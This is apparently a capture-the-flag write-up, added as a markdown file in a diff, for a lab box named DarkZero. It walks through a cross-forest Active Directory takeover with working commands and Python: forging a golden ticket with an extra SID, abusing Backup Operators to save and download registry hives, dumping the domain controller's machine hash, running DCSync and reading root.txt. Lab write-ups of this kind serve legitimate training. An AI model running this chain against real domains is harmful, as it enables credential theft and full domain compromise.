@@ -1,0 +1,282 @@
+# DarkZero Returns — Forest Jump to darkzero.htb / root.txt
+
+## Overview
+
+Attack chain: abuse a cross-forest Kerberos trust to escalate from `darkzero.ext` (owned) → `darkzero.htb` domain admin via **Backup Operators** privileges on `DC01.darkzero.htb`.
+
+---
+
+## 1. Recon the Forest Trust
+
+From a pivot host inside `darkzero.ext`, enumerate the trust:
+
+```powershell
+netdom trust darkzero.ext /d:darkzero.htb /enumerate
+```
+
+The trust is:  
+- **Direction:** Bidirectional  
+- **Type:** External (not transitive)  
+- **SID filtering:** "Treat as External" — SIDs with RID ≥ 1000 **pass through** (not quarantined)
+
+This means an extra SID from `darkzero.ext` can be injected into a Kerberos ticket and will be honored in `darkzero.htb`.
+
+---
+
+## 2. Find a Group with Privileges in darkzero.htb
+
+Enumerate groups on `DC01.darkzero.htb` via LDAP:
+
+```bash
+ldapsearch -H ldap://dc01.darkzero.htb -x -b "DC=darkzero,DC=htb" \
+  "(objectClass=group)" cn member
+```
+
+Key finding: **InfrastructureAdministrators** (RID 1603) is a member of **Backup Operators** in `darkzero.htb`.
+
+Backup Operators grants:
+- `SeBackupPrivilege` — read any file/registry key regardless of ACL
+- `SeRestorePrivilege` — write any file/registry key
+
+We can abuse this to dump the registry hives of `DC01` and extract its machine account hash.
+
+---
+
+## 3. Create a Golden Ticket with the Extra SID
+
+From our owned `darkzero.ext` domain, create a golden ticket for `Administrator@DARKZERO.EXT` that includes the RID 1603 extra SID.
+
+**Materials needed:**
+- `krbtgt` AES256 hash for `darkzero.ext` → `[redacted]`
+- Target domain SID for `darkzero.htb` → `[redacted]`
+- InfrastructureAdministrators RID: `1603`
+
+```bash
+impacket-ticketer -nthash [redacted] \
+  -domain darkzero.ext -domain-sid [redacted] \
+  -extra-sid [domain-sid-htb]-1603 \
+  -user-id 500 -groups 512,513,518,519,520 \
+  Administrator
+export KRB5CCNAME=Administrator.ccache
+```
+
+This creates a TGT for `Administrator@DARKZERO.EXT` whose PAC includes the extra SID. When used against `darkzero.htb`, the KDC sees this SID and grants Backup Operators privileges.
+
+---
+
+## 4. Obtain Cross-Realm Service Tickets
+
+With the golden TGT, request a cross-realm TGT to `DARKZERO.HTB`, then a service ticket for `CIFS/dc01.darkzero.htb`:
+
+```bash
+# Cross-realm TGT
+impacket-getST -self -impersonate Administrator \
+  -kdc [dc02-ip] \
+  -altservice krbtgt/DARKZERO.HTB \
+  DARKZERO.EXT/Administrator@DARKZERO.HTB
+
+# CIFS service ticket for DC01
+impacket-getST -kdc [dc01-ip] \
+  -altservice CIFS/dc01.darkzero.htb \
+  DARKZERO.HTB/Administrator@DARKZERO.HTB
+```
+
+Now the `KRB5CCNAME` cache contains:
+
+```
+krbtgt/DARKZERO.EXT@DARKZERO.EXT          (golden TGT)
+krbtgt/DARKZERO.HTB@DARKZERO.EXT          (cross-realm TGT)
+cifs/dc01.darkzero.htb@DARKZERO.HTB       (CIFS service ticket for DC01)
+ldap/dc01.darkzero.htb@DARKZERO.HTB       (LDAP service ticket for DC01)
+```
+
+---
+
+## 5. Connect to DC01 via SMB 2.0.2
+
+Impacket's SMB3 implementation does not handle `STATUS_MORE_PROCESSING_REQUIRED` in the Kerberos SPNEGO exchange (a multi-step challenge/response). The fix: force SMB 2.0.2 dialect instead of SMB 3.x.
+
+SMB 2.0.2 has simpler signing/encryption requirements and handles the single-round-trip Kerberos AP-REQ cleanly.
+
+```python
+from impacket.smbconnection import SMBConnection
+from impacket import smb3
+
+conn = SMBConnection("dc01.darkzero.htb", "[dc01-ip]",
+                     timeout=60,
+                     preferredDialect=smb3.SMB2_DIALECT_002)
+conn.kerberosLogin("Administrator", "", "DARKZERO.EXT")
+```
+
+---
+
+## 6. Trigger RemoteRegistry + Connect to WinReg
+
+Backup Operators needs `RemoteRegistry` service running. Trigger it via the named pipe trick (opening `\winreg` on `IPC$` causes auto-start):
+
+```python
+from impacket.dcerpc.v5 import transport, rrp
+
+# Trigger RemoteRegistry
+tid = conn.connectTree("IPC$")
+try:
+    conn.openFile(tid, r"\winreg", 0x12019f,
+                  creationOption=0x40, fileAttributes=0x80)
+except:
+    pass
+time.sleep(2)
+
+# Connect to winreg RPC pipe
+rpc = transport.DCERPCTransportFactory(r"ncacn_np:445[\pipe\winreg]")
+rpc.set_smb_connection(conn)
+rrp_rpc = rpc.get_dce_rpc()
+rrp_rpc.connect()
+rrp_rpc.bind(rrp.MSRPC_UUID_RRP)
+```
+
+---
+
+## 7. Save HKLM Hives to Disk
+
+With `REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK`, open each root key and save to a file:
+
+```python
+output_path = "C:\\Windows\\Temp"
+for sub_key in ["SAM", "SYSTEM", "SECURITY"]:
+    hklm = rrp.hOpenLocalMachine(rrp_rpc)
+    hkey = rrp.hBaseRegOpenKey(rrp_rpc, hklm["phKey"], sub_key,
+        dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK,
+        samDesired=rrp.KEY_READ)
+    rrp.hBaseRegSaveKey(rrp_rpc, hkey["phkResult"],
+                        f"{output_path}\\{sub_key}.save")
+```
+
+Files created on DC01:
+```
+C:\Windows\Temp\SAM.save      (28 KB)
+C:\Windows\Temp\SYSTEM.save   (16 MB)
+C:\Windows\Temp\SECURITY.save (36 KB)
+```
+
+---
+
+## 8. Download Hives via ADMIN$ Share
+
+These files are under `C:\Windows\Temp\`, accessible via the `ADMIN$` share (`ADMIN$` = `C:\Windows`):
+
+```python
+for fname in ["SAM.save", "SYSTEM.save", "SECURITY.save"]:
+    with open(f"/tmp/{fname}", "wb") as f:
+        def cb(data):
+            f.write(data)
+        conn.getFile("ADMIN$", f"\\Temp\\{fname}", cb)
+```
+
+---
+
+## 9. Extract DC01$ Machine Account Hash
+
+Run `secretsdump` locally on the hive files:
+
+```bash
+impacket-secretsdump -sam /tmp/SAM.save -system /tmp/SYSTEM.save \
+  -security /tmp/SECURITY.save LOCAL
+```
+
+Output includes the `$MACHINE.ACC` (DC01$ computer account):
+
+```
+DARKZERO\DC01$:aes256-cts-hmac-sha1-96:[redacted]
+DARKZERO\DC01$:aes128-cts-hmac-sha1-96:[redacted]
+DARKZERO\DC01$:des-cbc-md5:[redacted]
+DARKZERO\DC01$:NTLM:[redacted]     ← THIS ONE
+```
+
+The NTLM hash is the machine account credential for `DC01$@DARKZERO.HTB`.
+
+---
+
+## 10. DCSync via DRSUAPI (DC01$ as Domain Controller)
+
+Since `DC01` is a domain controller, the `DC01$` machine account has **Replicate Directory Changes** rights by default. Use its NTLM hash to invoke the `DRSUAPI` `DsGetNCChanges` call (DCSync):
+
+```bash
+impacket-secretsdump DARKZERO.HTB/DC01\$@dc01.darkzero.htb \
+  -hashes :[dc01-ntlm-hash] \
+  -just-dc-user Administrator \
+  -target-ip [dc01-ip]
+```
+
+```
+Administrator:500:NTLM:[redacted]:::
+
+Administrator:aes256-cts-hmac-sha1-96:[redacted]
+Administrator:aes128-cts-hmac-sha1-96:[redacted]
+```
+
+Now we have the **darkzero.htb Administrator** hash.
+
+---
+
+## 11. Get TGT for Administrator@DARKZERO.HTB
+
+Request a Kerberos TGT using the AES256 key (the KDC has RC4 disabled):
+
+```bash
+impacket-getTGT DARKZERO.HTB/Administrator \
+  -aesKey [aes256-key] \
+  -dc-ip [dc01-ip]
+
+# Ticket saved to Administrator.ccache
+```
+
+---
+
+## 12. Read root.txt via C$ Share
+
+With the TGT, authenticate via Kerberos to `C$` share and download `root.txt`:
+
+```python
+import os
+os.environ["KRB5CCNAME"] = "/path/to/Administrator.ccache"
+
+conn = SMBConnection("dc01.darkzero.htb", "[dc01-ip]",
+                     timeout=60,
+                     preferredDialect=smb3.SMB2_DIALECT_002)
+conn.kerberosLogin("Administrator", "", "DARKZERO.HTB")
+
+with open("/tmp/root.txt", "wb") as f:
+    def cb(data):
+        f.write(data)
+    conn.getFile("C$",
+                 r"\Users\Administrator\Desktop\root.txt", cb)
+
+with open("/tmp/root.txt") as f:
+    print(f.read().strip())
+```
+
+```text
+[redacted]
+```
+
+---
+
+## Attack Map
+
+```
+darkzero.ext (owned)
+    │
+    ├─ krbtgt AES256 key → golden ticket
+    ├─ extra SID: RID 1603 (InfrastructureAdministrators)
+    │
+    ├─ cross-realm TGT → CIFS/dc01.darkzero.htb
+    │
+    ├─ SMB 2.0.2 + Kerberos → DC01
+    │   ├─ Backup Operators → reg save HKLM SAM/SYSTEM/SECURITY
+    │   ├─ ADMIN$ share → download hives
+    │   └─ secretsdump LOCAL → DC01$ NTLM hash
+    │
+    ├─ DC01$ hash → DRSUAPI DCSync
+    │
+    └─ Administrator@DARKZERO.HTB hash → C$\root.txt ✅
+```
